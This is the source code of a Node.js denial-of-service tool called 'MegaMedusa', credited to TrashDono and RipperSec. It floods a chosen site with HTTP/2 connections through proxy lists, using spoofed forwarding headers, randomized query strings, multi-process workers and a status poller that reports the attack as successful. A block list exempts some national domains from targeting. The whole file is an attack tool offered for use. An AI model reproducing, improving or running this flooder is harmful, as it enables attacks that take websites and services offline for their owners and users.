//MegaMedusa-DDoS-Machine
//Github: TrashDono
//Telegram: RipperSec
const net = require('net');
const http2 = require("http2");
const tls = require('tls');
const cluster = require('cluster');
const url = require("url");
const crypto = require("crypto");
const fs = require('fs');
const axios = require('axios');
const https = require('https');
const childProcess = require('child_process');
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (err) {});

if (process.argv.length < 7) {
    console.log(" █▀▄▀█ █▀▀ █▀▀▄ █──█ █▀▀ █▀▀█ █▀▀▄ █▀▀▄ █▀▀█ █▀▀ ");
    console.log(" █─▀─█ █▀▀ █──█ █──█ ▀▀█ █▄▄█ █──█ █──█ █──█ ▀▀█ ");
    console.log(" ▀───▀ ▀▀▀ ▀▀▀─ ─▀▀▀ ▀▀▀ ▀──▀ ▀▀▀─ ▀▀▀─ ▀▀▀▀ ▀▀▀ ");
    console.log(" ╚═════╦════════════════════════════════════════════╦═════╝ ");
    console.log(" ║ Author : TrashDono ║ ");
    console.log(" ║ Github : https://github.com/TrashDono ║ ");
    console.log(" ║ Telegram : https://t.me/RipperSec ║ ");
    console.log(" ╚════════════════════════════════════════════╝");
    console.log(" node Medusa <HOST> <TIME> <RPS> <THREADS> <PROXY>.");
    process.exit();
}

const headers = {};
function readLines(file) {
    return fs.readFileSync(file, "utf-8").toString().split(/\r?\n/);
}
const targetURL = process.argv[2];
const agent = new https.Agent({
    'rejectUnauthorized': false
});
const domain = process.argv[2];
const parsedUrl = new URL(domain);
const blockedDomain = ['.id', ".my", ".ps", "go.id", '.lb', '.ir', ".bd", '.ye', ".iq", '-ye', "malaysia", "palestine", 'indonesia', "bangladesh", "yemen", ".bn", '.tr'];
if (blockedDomain.some(d => parsedUrl.hostname.toLowerCase().endsWith(d))) {
    console.log("[Waring] This Domain " + parsedUrl.hostname + " blocked");
    process.exit(1);
}

function getStatus() {
    const timeout = new Promise((_, reject) => {
        setTimeout(() => {
            reject(new Error("Request timed out"));
        }, 5000);
    });
    const request = axios.get(targetURL, {
        'httpsAgent': agent
    });
    Promise.race([request, timeout]).then(res => {
        console.log("[MegaMedusa] -> (" + ip_spoof() + ") / " + getTitleFromHTML(res.data) + " (" + res.status + ")");
    }).catch(err => {
        console.log("[MegaMedusa] -> " + err.message);
    });
}

function getTitleFromHTML(html) {
    const match = html.match(/<title>(.*?)<\/title>/i);
    return match && match[1]? match[1] : "Not Found";
}

function randstr(len) {
    let str = '';
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < len; i++) {
        str += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return str;
}
function randayat(len) {
    let str = '';
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    for (let i = 0; i < len; i++) {
        str += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return str;
}
function randnombor(len) {
    let str = '';
    const chars = '0123456789';
    for (let i = 0; i < len; i++) {
        str += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return str;
}

const ip_spoof = () => {
    return Math.floor(Math.random() * 256) + '.' + Math.floor(Math.random() * 256) + '.' + Math.floor(Math.random() * 256) + '.' + Math.floor(Math.random() * 256);
};
const spoofed = ip_spoof();
const args = {
    'target': process.argv[2],
    'time': ~~process.argv[3],
    'Rate': ~~process.argv[4],
    'threads': ~~process.argv[5],
    'proxyFile': process.argv[6]
};

const os = require('os');
if (cluster.isMaster) {
    console.clear();
    console.log("░█▀▄▀█ █▀▀ █▀▀▀ █▀▀█ ░█▀▄▀█ █▀▀ █▀▀▄ █──█ █▀▀ █▀▀█ ");
    console.log("░█░█░█ █▀▀ █─▀█ █▄▄█ ░█░█░█ █▀▀ █──█ █──█ ▀▀█ █▄▄█ ");
    console.log("░█──░█ ▀▀▀ ▀▀▀▀ ▀──▀ ░█──░█ ▀▀▀ ▀▀▀─ ─▀▀▀ ▀▀▀ ▀──▀ V3.2 ");
    console.log("--------------------------------------------");
    console.log("-> Target ⚡️ : " + process.argv[2]);
    console.log("-> Time ⏳ : " + process.argv[3]);
    console.log("-> Rate 💣 : " + process.argv[4]);
    console.log("-> Thread ⚙️ : " + process.argv[5]);
    console.log("-> ProxyFile 🗃 : " + process.argv[6]);
    console.log("--------------------------------------------");

    for (let i = 1; i <= process.argv[5]; i++) {
        cluster.fork();
        console.log("[MegaMedusa] -> Engine " + i + " Started");
    }
    setInterval(getStatus, 2000);
    setTimeout(() => {
        console.log("[MegaMedusa] -> Attack Successful ✅");
        process.exit(1);
    }, process.argv[3] * 1000);
} else {
    setInterval(runFlooder, 1);
}

const pathts = ['?s=', '/?', '', "?q=", '?true=', '?', '/'];
const cplist = ["ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES"];
const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"];
const lang_header = ["en-US,en;q=0.9"];
const encoding_header = ["gzip, deflate, br"];
const control_header = ["no-cache"];
const refers = ["https://google.com/"];
const userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"];
const Methods = ["GET"];
const queryString = ['&', '?', '='];
const useragentl = ["(ChromeBrowser 3_0)"];
const mozilla = ["Mozilla/5.0 "];
const platform = ["Windows", "Linux"];
const version = ["\"Google Chrome\";v=\"121\""];
const browsers = ["Google Chrome"];
const sechuas = ["Windows"];

var RipperSec = Methods[Math.floor(Math.random() * Methods.length)];
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
var cipper = cplist[Math.floor(Math.random() * cplist.length)];
var platform1 = platform[Math.floor(Math.random() * platform.length)];
var versi = version[Math.floor(Math.random() * version.length)];
var uap1 = userAgents[Math.floor(Math.random() * userAgents.length)];
var accept = accept_header[Math.floor(Math.random() * accept_header.length)];
var lang = lang_header[Math.floor(Math.random() * lang_header.length)];
var moz = mozilla[Math.floor(Math.random() * mozilla.length)];
var az1 = useragentl[Math.floor(Math.random() * useragentl.length)];
var encoding = encoding_header[Math.floor(Math.random() * encoding_header.length)];
var control = control_header[Math.floor(Math.random() * control_header.length)];
var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = new URL(args.target);

class NetSocket {
    constructor() {}
    async HTTP(options, callback) {
        const { address, host, port, timeout } = options;
        const proxy = address.split(':');
        const req = "CONNECT " + address + " HTTP/1.1\r\nHost: " + address + "\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
        const buf = Buffer.from(req);
        return new Promise((resolve, reject) => {
            const socket = net.connect({ host, port });
            socket.setTimeout(timeout * 1000);
            socket.on("connect", () => socket.write(buf));
            socket.on("data", data => {
                if (!data.toString().includes("HTTP/1.1 200")) {
                    socket.destroy();
                    reject(new Error("proxy error"));
                } else resolve(socket);
            });
            socket.on("timeout", () => { socket.destroy(); reject(new Error("timeout")); });
            socket.on("error", err => { socket.destroy(); reject(err); });
        }).then(s => callback(s, undefined)).catch(e => callback(undefined, e.message));
    }
}
const Socker = new NetSocket();

headers[':method'] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.pathname + parsedTarget.search + pathts[Math.floor(Math.random() * pathts.length)] + '&' + randstr(10) + '&r=' + randstr(10);
headers[':scheme'] = "https";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = control;
headers['X-Forwarded-For'] = spoofed;
headers["sec-ch-ua"] = "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\"";
headers["sec-ch-ua-mobile"] = "?0";
headers['sec-ch-ua-platform'] = platform1;
headers["accept-language"] = lang;
headers['accept-encoding'] = encoding;
headers.Connection = "keep-alive";
headers.accept = accept;
headers['sec-fetch-mode'] = "navigate";
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-site"] = "none";
headers.Referer = randomReferer;
headers.Upgrade = "websocket";

function runFlooder() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    headers["user-agent"] = moz + az1 + uap1;
    const options = {
        'host': proxy[0],
        'port': ~~proxy[1],
        'address': parsedTarget.host + ":443",
        'timeout': 100
    };
    Socker.HTTP(options, (socket, err) => {
        if (err) return;
        socket.setKeepAlive(true, 60000);
        const tlsOptions = {
            'host': parsedTarget.host,
            'port': 443,
            'secure': true,
            'socket': socket,
            'ciphers': tls.getCiphers().join(':') + cipper,
            'ecdhCurve': "prime256v1:X25519",
            'rejectUnauthorized': false,
            'servername': parsedTarget.host
        };
        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsSocket.setKeepAlive(true, 60000);
        const client = http2.connect(parsedTarget.href, {
            'protocol': "https:",
            'createConnection': () => tlsSocket
        });
        client.settings({ 'enablePush': false });
        client.on("close", () => { client.destroy(); socket.destroy(); });
        client.on("error", () => { client.destroy(); socket.destroy(); });
    });
}

setTimeout(() => process.exit(1), args.time * 1000);
